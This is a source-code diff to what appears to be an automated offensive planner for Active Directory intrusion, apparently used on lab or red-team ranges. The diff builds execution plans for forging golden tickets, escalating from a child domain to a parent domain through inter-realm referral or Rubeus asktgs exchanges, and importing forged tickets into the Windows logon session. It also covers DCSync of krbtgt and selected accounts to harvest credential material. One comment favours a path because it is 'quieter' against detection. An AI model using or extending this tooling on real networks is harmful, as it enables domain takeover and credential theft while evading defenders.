@@ -178,12 +178,17 @@ def actions_from_state(state: Any) -> list[CapabilityAction]:
         achieved=achieved,
         terminal_failed=terminal_failed,
     )
+    restrict_opportunistic_account_targets = (
+        not downstream_account_targets
+        and _objective_target_trusted_scope_pending(state)
+    )
 
     for domain, account, source_fact in _credential_target_accounts(
         facts,
         unavailable_effects,
         getattr(state, "objective", ""),
         downstream_targets=downstream_account_targets,
+        restrict_to_explicit=restrict_opportunistic_account_targets,
     ):
         effect = f"creds:{account}@{domain}"
         if effect in achieved or effect in terminal_failed:
@@ -2853,6 +2858,28 @@ def _build_forge_golden_ticket_execution_plan(
         _input_text(inputs, "kerberos_context_strategy", "ticket_strategy", "ticket_store")
         or "ticket-store-fork-run"
     )
+    ticket_acquisition_strategy = _normalize(
+        _input_text(
+            inputs,
+            "kerberos_ticket_acquisition_strategy",
+            "ticket_acquisition_strategy",
+            "service_ticket_strategy",
+        )
+        or action.intent.get("kerberos_ticket_acquisition_strategy")
+        or action.intent.get("ticket_acquisition_strategy")
+        or action.intent.get("service_ticket_strategy")
+        or "os-native"
+    )
+    explicit_tgs_exchange = ticket_acquisition_strategy in {
+        "asktgs",
+        "explicit",
+        "explicit-asktgs",
+        "explicit_asktgs",
+        "explicit-tgs",
+        "explicit_tgs",
+        "rubeus-asktgs",
+        "rubeus_asktgs",
+    }
     proof_host = _input_text(inputs, "proof_host", "service_host", "target_host", "dc", "domain_controller")
     proof_resource = _input_text(inputs, "proof_resource", "service_resource", "target_resource", "proof_path")
     if not proof_resource and proof_host:
@@ -2861,9 +2888,10 @@ def _build_forge_golden_ticket_execution_plan(
         proof_resource = "{{kerberos_service_resource}}"
 
     establish_context = _input_bool(inputs, "establish_context", default=True)
-    # The inter-realm referral hop + parent-DCSync proof are specific to the forge-golden-ticket objective
-    # (cross a domain boundary and prove parent-domain DA). ensure-kerberos-context reuses this builder only to
-    # establish a callback-scoped context proven by service access, so it opts out of the referral/DCSync path.
+    # The cross-domain parent-DCSync proof is specific to the forge-golden-ticket objective. The default path
+    # lets Windows obtain any referral/service tickets from the imported TGT on demand; explicit asktgs is only
+    # an override. ensure-kerberos-context reuses this builder only to establish a callback-scoped context proven
+    # by service access, so it opts out of the parent-DCSync path.
     cross_domain = (
         bool(target_domain and target_domain != domain)
         and not _input_bool(inputs, "reuse_as_kerberos_context", default=False)
@@ -2920,19 +2948,13 @@ def _build_forge_golden_ticket_execution_plan(
         )
     )
     if cross_domain:
-        # Child->parent escalation requires two TGS exchanges: obtain a parent referral from the child DC, then
-        # exchange that referral at the parent DC for the service ticket used by the proof operation.
-        # Range-agnostic: child/parent domains and both DCs come from resolved inputs, never literals.
+        # Once a forged child-domain TGT is imported into the current Windows logon session, the OS can usually
+        # acquire the inter-realm referral and service ticket naturally when the final operation authenticates.
+        # Explicit Rubeus asktgs remains available for cases that truly need a standalone TGS artifact, but it is
+        # not the default: using the native logon context is quieter and avoids transporting large ticket blobs
+        # through payload-specific assembly runners.
         child_dc = _input_text(inputs, "child_dc", "source_dc", "child_domain_controller")
         parent_dc = proof_host or _input_text(inputs, "parent_dc", "target_dc", "target_domain_controller")
-        referral_parameters: dict[str, Any] = {
-            "target_domain": target_domain,
-            "service": f"krbtgt/{target_domain}",
-            "ticket_base64": "{{kerberos_ticket_base64}}",
-            "nowrap": True,
-        }
-        if child_dc:
-            referral_parameters["child_dc"] = child_dc
         dcsync_parameters: dict[str, Any] = {
             "domain": target_domain,
             "account": "krbtgt",
@@ -2940,35 +2962,64 @@ def _build_forge_golden_ticket_execution_plan(
         }
         if parent_dc:
             dcsync_parameters["dc"] = parent_dc
+        if explicit_tgs_exchange:
+            referral_parameters: dict[str, Any] = {
+                "target_domain": target_domain,
+                "service": f"krbtgt/{target_domain}",
+                "ticket_base64": "{{kerberos_ticket_base64}}",
+                "nowrap": True,
+            }
+            if child_dc:
+                referral_parameters["child_dc"] = child_dc
+            steps.extend([
+                CapabilityExecutionStep(
+                    operation="kerberos-inter-realm-referral",
+                    parameters=referral_parameters,
+                    capability=action.name,
+                    purpose=(
+                        f"explicitly exchange the forged {domain} ticket for an inter-realm referral ticket "
+                        f"honored by {target_domain}"
+                    ),
+                    expected_probe="extract_forged_ticket_artifact",
+                    prerequisites=["artifact:kerberos_ticket_base64"],
+                ),
+                CapabilityExecutionStep(
+                    operation="kerberos-service-ticket-request",
+                    parameters={
+                        "target_domain": target_domain,
+                        "service": f"ldap/{parent_dc}" if parent_dc else "ldap/{{kerberos_service_host}}",
+                        "ticket_base64": "{{kerberos_ticket_base64}}",
+                        "dc": parent_dc or "{{kerberos_service_host}}",
+                        "nowrap": True,
+                    },
+                    capability=action.name,
+                    purpose=(
+                        f"explicitly exchange the {target_domain} referral for the LDAP service ticket used "
+                        "by the parent-domain replication proof"
+                    ),
+                    expected_probe="extract_forged_ticket_artifact",
+                    prerequisites=["artifact:kerberos_ticket_base64"],
+                ),
+            ])
+        imported_ticket_domain = target_domain if explicit_tgs_exchange else domain
+        import_purpose = (
+            "load the explicit parent-domain service ticket into the current Kerberos context"
+            if explicit_tgs_exchange
+            else (
+                f"load the forged {domain} TGT into the current Kerberos context so Windows can acquire "
+                f"{target_domain} referral and service tickets on demand"
+            )
+        )
+        inventory_purpose = (
+            "verify the explicit parent-domain service ticket is present in the current context before the "
+            "replication proof"
+            if explicit_tgs_exchange
+            else (
+                f"verify the forged {domain} TGT is present in the current context before Windows acquires "
+                f"{target_domain} tickets on demand"
+            )
+        )
         steps.extend([
-            CapabilityExecutionStep(
-                operation="kerberos-inter-realm-referral",
-                parameters=referral_parameters,
-                capability=action.name,
-                purpose=(
-                    f"exchange the forged {domain} ticket for an inter-realm referral ticket honored by "
-                    f"{target_domain}"
-                ),
-                expected_probe="extract_forged_ticket_artifact",
-                prerequisites=["artifact:kerberos_ticket_base64"],
-            ),
-            CapabilityExecutionStep(
-                operation="kerberos-service-ticket-request",
-                parameters={
-                    "target_domain": target_domain,
-                    "service": f"ldap/{parent_dc}" if parent_dc else "ldap/{{kerberos_service_host}}",
-                    "ticket_base64": "{{kerberos_ticket_base64}}",
-                    "dc": parent_dc or "{{kerberos_service_host}}",
-                    "nowrap": True,
-                },
-                capability=action.name,
-                purpose=(
-                    f"exchange the {target_domain} referral for the LDAP service ticket used by the "
-                    "parent-domain replication proof"
-                ),
-                expected_probe="extract_forged_ticket_artifact",
-                prerequisites=["artifact:kerberos_ticket_base64"],
-            ),
             CapabilityExecutionStep(
                 operation="kerberos-ticket-purge",
                 parameters={
@@ -2977,19 +3028,19 @@ def _build_forge_golden_ticket_execution_plan(
                     "store": "agent-cache",
                 },
                 capability=action.name,
-                purpose="clear the current Kerberos context before importing the referral ticket",
+                purpose="clear the current Kerberos context before importing the capability ticket",
                 expected_probe="extract_ticket_cache_probe",
             ),
             CapabilityExecutionStep(
                 operation="kerberos-ticket-import",
                 parameters={
-                    "domain": target_domain,
+                    "domain": imported_ticket_domain,
                     "ticket_artifact": "{{kerberos_ticket_base64}}",
                     "target_context": "current",
                     "store": "agent-cache",
                 },
                 capability=action.name,
-                purpose="load the referral ticket into the current Kerberos context",
+                purpose=import_purpose,
                 expected_probe="extract_ticket_import_probe",
                 prerequisites=["artifact:kerberos_ticket_base64"],
             ),
@@ -3001,7 +3052,7 @@ def _build_forge_golden_ticket_execution_plan(
                     "store": "agent-cache",
                 },
                 capability=action.name,
-                purpose="verify the referral ticket is present in the current context before the access proof",
+                purpose=inventory_purpose,
                 expected_probe="extract_ticket_cache_probe",
             ),
             CapabilityExecutionStep(
@@ -3090,7 +3141,11 @@ def _build_forge_golden_ticket_execution_plan(
         True,
         steps=steps,
         reason=(
-            "built child->parent forge plus referral/service TGS hops and parent-DCSync proof"
+            (
+                "built cross-domain forge with explicit referral/service TGS exchange and parent-DCSync proof"
+                if explicit_tgs_exchange
+                else "built cross-domain forge with OS-native referral acquisition and parent-DCSync proof"
+            )
             if cross_domain
             else "built generic Kerberos ticket forge plus isolated context-use and service-proof steps"
         ),
@@ -3228,6 +3283,21 @@ def _build_refresh_current_kerberos_context_execution_plan(
             expected_probe="extract_ticket_cache_probe",
         ),
         CapabilityExecutionStep(
+            operation="kerberos-service-ticket-acquire",
+            parameters={
+                "domain": target_domain,
+                "resource": proof_resource,
+                "target_context": "current",
+                "store": "current",
+            },
+            capability=action.name,
+            purpose=(
+                "request a fresh service ticket from the existing logon session before "
+                "proving callback-scoped access"
+            ),
+            expected_probe="extract_ticket_cache_probe",
+        ),
+        CapabilityExecutionStep(
             operation="kerberos-context-service-proof",
             parameters={
                 "domain": target_domain,
@@ -3236,6 +3306,7 @@ def _build_refresh_current_kerberos_context_execution_plan(
                 "store": "current",
                 "action": "list",
                 "requires_import": False,
+                "requires_acquisition": True,
             },
             capability=action.name,
             purpose=(
@@ -5515,14 +5586,18 @@ def _credential_target_accounts(
     achieved: set[str],
     objective: Any = "",
     downstream_targets: set[tuple[str, str]] | None = None,
+    restrict_to_explicit: bool = False,
 ) -> list[tuple[str, str, str]]:
     """Return objective-relevant non-krbtgt accounts whose credential material should be extracted.
 
     The source can be a graph/objective fact such as ``credential-target:alice@lab.local`` or a structured
     fact tail like ``credential-target:domain=lab.local;account=alice``. This keeps range-specific names out
-    of Sage while giving BloodHound/objective analysis a deterministic hook into account DCSync.
+    of Sage while giving BloodHound/objective analysis a deterministic hook into account DCSync. When the
+    objective target scope is visible but still uncollected, callers can suppress generic harvestable
+    principals while preserving accounts explicitly selected by the objective or a downstream route.
     """
     targets: dict[tuple[str, str], str] = {}
+    explicit_objective_targets: set[tuple[str, str]] = set()
     for fact in sorted(facts):
         for prefix in _CREDENTIAL_TARGET_PREFIXES:
             if not fact.startswith(prefix):
@@ -5549,12 +5624,19 @@ def _credential_target_accounts(
     ):
         account, domain = _account_domain_from_target(match.group(1))
         if _dcsync_account_target_allowed(account, domain, achieved):
+            explicit_objective_targets.add((domain, account))
             targets.setdefault((domain, account), f"objective:{match.group(0)}")
     if downstream_targets:
         targets = {
             key: source
             for key, source in targets.items()
-            if key in downstream_targets or str(source).startswith("objective:")
+            if key in downstream_targets or key in explicit_objective_targets
+        }
+    elif restrict_to_explicit:
+        targets = {
+            key: source
+            for key, source in targets.items()
+            if key in explicit_objective_targets
         }
     else:
         satisfied_domains = _non_admin_credential_material_domains(achieved)
@@ -5565,6 +5647,29 @@ def _credential_target_accounts(
                 if key[0] not in satisfied_domains
             }
     return [(domain, account, source) for (domain, account), source in sorted(targets.items())]
+
+
+def _objective_target_trusted_scope_pending(state: Any) -> bool:
+    """Whether the objective names a trusted domain that still needs scoped collection.
+
+    The controller already uses engagement-state's trust/collection helpers to decide when a targeted
+    collection is justified. Reuse that same read-only signal here so broad harvestable account facts do not
+    keep the frontier non-empty before the route-defining target scope has been collected.
+    """
+    try:
+        try:
+            from . import engagement_state as _es
+        except ImportError:
+            import engagement_state as _es
+        objective_targets = list(_es._objective_target_domains(getattr(state, "objective", "") or ""))
+        if not objective_targets:
+            return False
+        return any(
+            any(_es._domains_equivalent(domain, target) for target in objective_targets)
+            for domain in _es.trusted_uncollected_domains(state)
+        )
+    except Exception:
+        return False
 
 
 def _credential_accounts_required_by_downstream(
